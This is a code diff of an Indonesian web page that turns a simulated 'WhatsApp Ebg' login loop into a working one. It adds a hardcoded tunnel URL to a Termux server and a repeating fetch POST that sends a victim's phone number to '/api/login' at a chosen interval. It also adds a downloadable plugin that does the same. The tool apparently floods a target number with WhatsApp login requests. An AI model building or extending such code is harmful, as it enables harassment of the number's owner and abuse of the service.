@@ -69,7 +69,10 @@
         let intervalId = null;
         let isRunning = false;
 
-        // Fungsi untuk mencetak log ke monitor boks hitam
+        // Taruh URL https:// yang kamu dapatkan da:
+        const URL_TUNNEL_TERMUX = "https://cxovd-112-215-200-88.run.pinggy-free.link";
+
+        // Fungsi mencetak log pesan ke boks hitam monitor
         function logMsg(msg, color = "#0f0") {
             const m = document.getElementById('monitorLog');
             const time = new Date().toLocaleTimeString('id-ID', { hour12: false });
@@ -77,19 +80,30 @@
             m.scrollTop = m.scrollHeight;
         }
 
-        // Fungsi Simulasi Internal khusus untuk dijalankan langsung di browser/GitHub Pages
-        function executeLocalLogin(number) {
-            // Karena tidak ada bot, kita acak statusnya agar konsol terlihat hidup dan nyata mengirim data
-            const isSuccess = Math.random() > 0.15; // 85% peluang sukses, 15% gagal
+        // Fungsi REAL HTTP Request mengirim data nomor ke Server Termux
+        async function sendLoginToServer(number) {
+            try {
+                const response = await fetch(`${URL_TUNNEL_TERMUX}/api/login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ target: number })
+                });
 
-            if (isSuccess) {
-                logMsg(`Command success: Mengirim paket data login ke ${number}...`, "#25D366");
-            } else {
-                logMsg(`Command gagal: Terjadi gangguan jaringan internal pada nomor ${number}`, "#ef4444");
+                const result = await response.json();
+
+                if (response.ok && result.status === 'success') {
+                    // Menampilkan pesan sukses dari respons server Node.js Termux
+                    logMsg(`Command success: ${result.message}`, "#25D366");
+                } else {
+                    logMsg(`Command gagal: ${result.message || 'Server menolak koneksi'}`, "#ef4444");
+                }
+            } catch (error) {
+                // Terjadi apabila url salah, server mati, atau kendala jaringan internet
+                logMsg(`Command gagal: Hubungan ke Termux Terputus (${error.message})`, "#ef4444");
             }
         }
 
-        // Memulai proses loop login terus menerus
+        // Fungsi memicu loop pengiriman terus-menerus
         function startLogin() {
             const no = document.getElementById('waNumber').value.trim();
             const ms = parseInt(document.getElementById('timeSelect').value);
@@ -99,7 +113,7 @@
                 return; 
             }
             if(no.includes('+')) {
-                logMsg("Error: Hapus tanda '+' pada nomor global!", "#ef4444");
+                logMsg("Error: Masukkan nomor tanpa karakter '+' !", "#ef4444");
                 return;
             }
             
@@ -109,38 +123,48 @@
             document.getElementById('btnLogin').disabled = true;
             document.getElementById('btnStop').disabled = false;
             
-            logMsg(`START: Mengaktifkan pengiriman login otomatis ke ${no} setiap ${ms/1000} detik.`, "#38bdf8");
+            logMsg(`START: Menghubungkan ke server Termux. Mengirim loop login ke ${no} tiap ${ms/1000} dtk.`, "#38bdf8");
             
-            // Eksekusi kiriman pertama secara instan
-            executeLocalLogin(no);
+            // Tembakan data pertama secara instan
+            sendLoginToServer(no);
             
-            // Lakukan looping terus-menerus sesuai interval waktu pilihan
+            // Melakukan looping otomatis konstan berdasarkan tabel pilihan waktu
             intervalId = setInterval(() => {
-                executeLocalLogin(no);
+                sendLoginToServer(no);
             }, ms);
         }
 
-        // Memberhentikan proses loop login
+        // Fungsi menghentikan siklus looping
         function stopLogin() {
             if(!isRunning) return;
             
-            clearInterval(intervalId); // Hentikan perulangan waktu
+            clearInterval(intervalId); // Mematikan interval proses
             isRunning = false;
             
             document.getElementById('btnLogin').disabled = false;
             document.getElementById('btnStop').disabled = true;
             
-            logMsg("STOP: Proses command dihentikan oleh pengguna.", "#ef4444");
+            logMsg("STOP: Proses sinkronisasi login dihentikan.", "#fbbf24");
         }
 
         function downloadPluginWA() {
             const code = `
-/* Plugin ZyrClient - WhatsApp Ebg Local Loop Function */
+/* Plugin ZyrClient - WhatsApp Ebg (Real Loop Termux Backend Integration) */
 let waInterval = null;
-function zyrWaEbgStart(number, delayMs) {
+function zyrWaEbgStart(number, delayMs, serverUrl) {
     if(waInterval) clearInterval(waInterval);
-    waInterval = setInterval(() => {
-        console.log("Command success: Paket login terkirim ke " + number);
+    waInterval = setInterval(async () => {
+        try {
+            let res = await fetch(serverUrl + '/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ target: number })
+            });
+            let data = await res.json();
+            console.log(data.status === "success" ? "Command success" : "Command gagal");
+        } catch(e) {
+            console.log("Command gagal: " + e.message);
+        }
     }, delayMs);
 }
 function zyrWaEbgStop() {
